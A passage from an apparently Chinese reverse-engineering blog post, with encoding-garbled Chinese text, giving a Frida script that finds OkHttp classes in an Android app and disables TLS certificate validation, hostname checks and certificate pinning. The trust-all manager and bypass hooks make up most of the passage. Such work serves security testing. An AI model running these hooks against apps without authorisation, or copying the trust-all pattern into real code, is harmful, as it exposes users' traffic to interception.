class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_">isOkhttpClient</span>(classNames[i]))&#123;</span><br><span class="line">                <span class="title class_">OkhttpClinetClassName</span> = classNames[i]</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Find OkhttpClinetClassName: &quot;</span> + <span class="title class_">OkhttpClinetClassName</span>)</span><br><span class="line">                <span class="comment">//è·å–OkhttpClinetClassNameç±»çš„å‰ç¼€ï¼Œæ¯”å¦‚okhttp3.OkHttpClientï¼Œå¾—åˆ°äº†okhttp3.</span></span><br><span class="line">                perfix = <span class="title class_">OkhttpClinetClassName</span>.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>] + <span class="string">&quot;.&quot;</span></span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classNames.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_">isCertificatePinner</span>(classNames[i],perfix))&#123;</span><br><span class="line">                <span class="title class_">CertificatePinnerClassName</span> = classNames[i]</span><br><span class="line">                <span class="comment">//console.log(&quot;Find CertificatePinnerClassName: &quot; + CertificatePinnerClassName)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Found class: &quot;</span> + classNames.<span class="property">length</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;OkHttp&#x27;s package prefix: &quot;</span> + perfix);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Find OkhttpClinetClassName: &quot;</span> + <span class="title class_">OkhttpClinetClassName</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Find CertificatePinnerClassName: &quot;</span> + <span class="title class_">CertificatePinnerClassName</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">OkhttpClinetClassName</span> == <span class="string">&quot;&quot;</span> || <span class="title class_">CertificatePinnerClassName</span> == <span class="string">&quot;&quot;</span> || perfix == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Can&#x27;t find OkhttpClinetClassName or CertificatePinnerClassName&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>  <span class="comment">//å¦‚æœæ‰¾åˆ°äº†okhttp3.OkHttpClientç±»å’Œokhttp3.CertificatePinnerç±»ï¼Œå¹¶ä¸”å¾—åˆ°äº†å‰ç¼€ï¼Œé‚£ä¹ˆå°±è¿”å›true</span></span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">loadClasses</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">findOkHttpClass</span>())&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>å°è¯•åœ¨åŠ è½½çš„ç±»ä¸­æŸ¥æ‰¾<strong>OkHttpClient</strong>å’Œ<strong>CertificatePinner</strong>è¿™ä¸¤ä¸ªç±»ï¼Œè¿è¡Œè¿™ä¸ªè„šæœ¬ï¼Œå‘ç°é€šè¿‡ä¸Šé¢è„šæœ¬å¯ä»¥æˆåŠŸæ‰¾åˆ°è¿™ä¸¤ä¸ªç±»ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407091035084.png" alt="image.png"> </p><h1 id="0x03-å®Œæ•´ä»£ç -è¯¦è§£"><a href="#0x03-å®Œæ•´ä»£ç -è¯¦è§£" class="headerlink" title="0x03 å®Œæ•´ä»£ç &amp;è¯¦è§£"></a>0x03 å®Œæ•´ä»£ç &amp;è¯¦è§£</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> classesNames = <span class="keyword">new</span> <span class="title class_">Array</span>()</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">OkhttpClientClassName</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">CertificatePinnerClassName</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">var</span> prefix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">initConsole</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Color</span> = &#123;<span class="attr">RESET</span>: <span class="string">&quot;\x1b[39;49;00m&quot;</span>, <span class="title class_">Black</span>: <span class="string">&quot;0;01&quot;</span>, <span class="title class_">Blue</span>: <span class="string">&quot;4;01&quot;</span>, <span class="title class_">Cyan</span>: <span class="string">&quot;6;01&quot;</span>, <span class="title class_">Gray</span>: <span class="string">&quot;7;11&quot;</span>, <span class="string">&quot;Green&quot;</span>: <span class="string">&quot;2;01&quot;</span>, <span class="title class_">Purple</span>: <span class="string">&quot;5;01&quot;</span>, <span class="title class_">Yellow</span>: <span class="string">&quot;3;01&quot;</span>,  <span class="title class_">Red</span>: <span class="string">&quot;1;01&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">LightColor</span> = &#123;<span class="attr">RESET</span>: <span class="string">&quot;\x1b[39;49;00m&quot;</span>, <span class="title class_">Black</span>: <span class="string">&quot;0;11&quot;</span>, <span class="title class_">Blue</span>: <span class="string">&quot;4;11&quot;</span>, <span class="title class_">Cyan</span>: <span class="string">&quot;6;11&quot;</span>, <span class="title class_">Gray</span>: <span class="string">&quot;7;01&quot;</span>, <span class="string">&quot;Green&quot;</span>: <span class="string">&quot;2;11&quot;</span>, <span class="title class_">Purple</span>: <span class="string">&quot;5;11&quot;</span>, <span class="title class_">Red</span>: <span class="string">&quot;1;11&quot;</span>, <span class="title class_">Yellow</span>: <span class="string">&quot;3;11&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">var</span> colorPrefix = <span class="string">&#x27;\x1b[3&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> colorSuffix = <span class="string">&#x27;m&#x27;</span></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Color</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">c</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (c  == <span class="string">&quot;RESET&quot;</span>) </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="variable language_">console</span>[c] = <span class="keyword">function</span>(<span class="params">message</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(colorPrefix + <span class="title class_">Color</span>[c] + colorSuffix + message + <span class="title class_">Color</span>.<span class="property">RESET</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">console</span>[<span class="string">&quot;Light&quot;</span> + c] = <span class="keyword">function</span>(<span class="params">message</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(colorPrefix + <span class="title class_">LightColor</span>[c] + colorSuffix + message + <span class="title class_">Color</span>.<span class="property">RESET</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadOkhttpClient</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;okhttp3.OkHttpClient&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">            <span class="comment">//console.error(e)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadClasses</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">clsName, handle</span>)&#123;</span><br><span class="line">                classesNames.<span class="title function_">push</span>(clsName)</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title class_">Green</span>(<span class="string">&quot;Search Class Completed!&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findOkhttpClass</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Modifier</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.reflect.Modifier&quot;</span>)</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">isOkhttpClient</span>(<span class="params">clsName</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(clsName.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="property">length</span> != <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(clsName)</span><br><span class="line">                <span class="keyword">var</span> interfaces = cls.<span class="property">class</span>.<span class="title function_">getInterfaces</span>()</span><br><span class="line">                <span class="keyword">const</span> count = interfaces.<span class="property">length</span></span><br><span class="line">                <span class="keyword">if</span>(count &lt; <span class="number">2</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> flag = <span class="literal">false</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; count; i++)&#123;</span><br><span class="line">                    <span class="keyword">var</span> interface_ = interfaces[i]</span><br><span class="line">                    <span class="keyword">var</span> interface_name = interface_.<span class="title function_">getName</span>()</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span>(interface_name.<span class="title function_">indexOf</span>(<span class="string">&quot;Cloneable&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        flag = <span class="literal">true</span></span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(interface_name.<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!flag) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getDeclaredClasses</span>().<span class="property">length</span> &lt; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>() != <span class="string">&#x27;java.lang.Object&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">isCertificatePinner</span>(<span class="params">clsName,prefix</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(!clsName.<span class="title function_">startsWith</span>(prefix))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(clsName.<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(clsName.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>).<span class="property">length</span> != <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> cls = <span class="title class_">Java</span>.<span class="title function_">use</span>(clsName)</span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">isInterface</span>())&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getInterfaces</span>().<span class="property">length</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         </span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getDeclaredClasses</span>().<span class="property">length</span> &lt; <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(cls.<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>() != <span class="string">&quot;java.lang.Object&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!<span class="title class_">Modifier</span>.<span class="title function_">isFinal</span>(cls.<span class="property">class</span>.<span class="title function_">getModifiers</span>()))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> flag = <span class="literal">false</span></span><br><span class="line">            <span class="keyword">var</span> methods = cls.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; methods.<span class="property">length</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> method = methods[i]</span><br><span class="line">                <span class="keyword">if</span>(method.<span class="title function_">getParameterCount</span>() &lt; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(method.<span class="title function_">getParameterTypes</span>()[<span class="number">0</span>].<span class="title function_">getName</span>() == <span class="string">&quot;java.security.cert.Certificate&quot;</span>)&#123;</span><br><span class="line">                    flag = <span class="literal">true</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!flag) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">            flag = <span class="literal">false</span></span><br><span class="line">            <span class="keyword">var</span> fields = cls.<span class="property">class</span>.<span class="title function_">getDeclaredFields</span>()</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>; k &lt; fields.<span class="property">length</span>; k++)&#123;</span><br><span class="line">                <span class="keyword">var</span> field = fields[k];</span><br><span class="line">                <span class="keyword">if</span>(field.<span class="title function_">getType</span>().<span class="title function_">getName</span>() == <span class="string">&quot;java.util.Set&quot;</span>)&#123;</span><br><span class="line">                    flag = <span class="literal">true</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!flag) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classesNames.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_">isOkhttpClient</span>(classesNames[i]))&#123;</span><br><span class="line">                <span class="title class_">OkhttpClientClassName</span> = classesNames[i]</span><br><span class="line">                <span class="keyword">var</span> prefix = classesNames[i].<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]+<span class="string">&#x27;.&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classesNames.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_">isCertificatePinner</span>(classesNames[i],prefix))&#123;</span><br><span class="line">                <span class="title class_">CertificatePinnerClassName</span> = classesNames[i]</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> printOut</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">OkhttpClientClassName</span> == <span class="string">&quot;&quot;</span> || <span class="title class_">CertificatePinnerClassName</span> == <span class="string">&quot;&quot;</span> || prefix == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">            printOut = <span class="variable language_">console</span>.<span class="property">Red</span></span><br><span class="line">            <span class="title function_">printOut</span>(<span class="string">&quot;Can&#x27;t find the okhttp class&quot;</span>)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            printOut = <span class="variable language_">console</span>.<span class="property">Green</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Found Class: &quot;</span>+classesNames.<span class="property">length</span>)</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Okhttp&#x27;s package prefix: &quot;</span>+prefix)</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Found the OkhttpClient: &quot;</span>+<span class="title class_">OkhttpClientClassName</span>)</span><br><span class="line">        <span class="title function_">printOut</span>(<span class="string">&quot;Found the OkhttpCertificatePinner: &quot;</span>+<span class="title class_">CertificatePinnerClassName</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Modifier</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.reflect.Modifier&quot;</span>)</span><br><span class="line">        <span class="comment">//TrustAllManager</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">TrustAllManagerClass</span> = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;TrustAllManager&quot;</span>,</span><br><span class="line">            <span class="attr">implements</span>:[<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.X509TrustManager&quot;</span>)],</span><br><span class="line">            <span class="attr">methods</span>: &#123;</span><br><span class="line">                <span class="title function_">checkClientTrusted</span>(<span class="params">chain, authType</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(<span class="string">&quot;checkClientTrusted Called!!&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="title function_">checkServerTrusted</span>(<span class="params">chain, authType</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(<span class="string">&quot;checkServerTrusted Called!!&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="title function_">getAcceptedIssuers</span>(<span class="params"></span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> [];</span><br><span class="line">                &#125;,</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> trustAllManagerHandle = <span class="title class_">TrustAllManagerClass</span>.$new()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sslContext = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.SSLContext&quot;</span>).<span class="title function_">getInstance</span>(<span class="string">&quot;TLS&quot;</span>)</span><br><span class="line">        sslContext.<span class="title function_">init</span>(<span class="literal">null</span>,<span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;Ljavax.net.ssl.X509TrustManager;&quot;</span>,[trustAllManagerHandle]),<span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">var</span> sslSocketFactory = sslContext.<span class="title function_">getSocketFactory</span>()</span><br><span class="line"></span><br><span class="line">        <span class="comment">//HostnameVerify</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">MyHostnameVerify</span> = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;MyHostnameVerify&quot;</span>,</span><br><span class="line">            <span class="attr">implements</span>:[<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>)],</span><br><span class="line">            <span class="attr">methods</span>: &#123;</span><br><span class="line">                <span class="title function_">verify</span>(<span class="params">hostname, session</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(hostname)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> myHostnameVerifyHandle = <span class="title class_">MyHostnameVerify</span>.$new()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> internalOkhttpClientClasses = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="title class_">OkhttpClientClassName</span>).<span class="property">class</span>.<span class="title function_">getDeclaredClasses</span>()</span><br><span class="line">        internalOkhttpClientClasses.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">internalClass</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> methods = internalClass.<span class="title function_">getDeclaredMethods</span>()</span><br><span class="line">            methods.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">method</span>) &#123;</span><br><span class="line">                 <span class="keyword">if</span>(method.<span class="title function_">getParameterCount</span>() &lt; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> firstParameterTypeName = method.<span class="title function_">getParameterTypes</span>()[<span class="number">0</span>].<span class="title function_">getName</span>()</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(firstParameterTypeName == <span class="string">&quot;javax.net.ssl.SSLSocketFactory&quot;</span>)&#123;</span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Builder</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(internalClass.<span class="title function_">getName</span>())</span><br><span class="line">                    <span class="keyword">var</span> sslSocketFacotryMethodName  = method.<span class="title function_">getName</span>()</span><br><span class="line">                    <span class="title class_">Builder</span>[sslSocketFacotryMethodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">SSLSocketFactory</span>)&#123;</span><br><span class="line">                            <span class="variable language_">arguments</span>[<span class="number">0</span>] = sslSocketFactory</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable language_">this</span>[sslSocketFacotryMethodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Blue</span>(sslSocketFacotryMethodName+<span class="string">&quot;  Hooked!&quot;</span>)</span><br><span class="line">                    &#125;);</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(firstParameterTypeName == <span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>)&#123;</span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Builder</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(internalClass.<span class="title function_">getName</span>())</span><br><span class="line">                    <span class="keyword">var</span> hostnameVerifierMethodName = method.<span class="title function_">getName</span>()</span><br><span class="line">                    <span class="title class_">Builder</span>[hostnameVerifierMethodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">hostnameVerifier</span>)&#123;</span><br><span class="line">                            <span class="variable language_">arguments</span>[<span class="number">0</span>] = myHostnameVerifyHandle</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable language_">this</span>[hostnameVerifierMethodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Yellow</span>(hostnameVerifierMethodName+<span class="string">&quot;  Hooked!&quot;</span>)</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(firstParameterTypeName == <span class="title class_">CertificatePinnerClassName</span>)&#123;</span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Builder</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(internalClass.<span class="title function_">getName</span>())</span><br><span class="line">                    <span class="keyword">var</span> certificatePinnerMethodName = method.<span class="title function_">getName</span>()</span><br><span class="line"></span><br><span class="line">                    <span class="title class_">Builder</span>[certificatePinnerMethodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">certificatePinner</span>)&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">retain</span>(<span class="variable language_">this</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Purple</span>(certificatePinnerMethodName+<span class="string">&quot;  Hooked!&quot;</span>)</span><br><span class="line">                    &#125;);</span><br><span class="line">                   </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">CertificatePinnerClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="title class_">CertificatePinnerClassName</span>)</span><br><span class="line">        <span class="keyword">var</span> methods = <span class="title class_">CertificatePinnerClass</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()</span><br><span class="line">        methods.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">method</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(method.<span class="title function_">getReturnType</span>().<span class="title function_">getName</span>() == <span class="string">&#x27;void&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> methodName = method.<span class="title function_">getName</span>()</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(methodName+<span class="string">&quot; Hooked!&quot;</span>)</span><br><span class="line">                <span class="title class_">CertificatePinnerClass</span>[methodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">overload</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(overload.<span class="property">returnType</span>.<span class="property">name</span> == <span class="string">&#x27;V&#x27;</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(<span class="string">&quot;certificatePinner check called!&quot;</span>)</span><br><span class="line">                        &#125;   </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 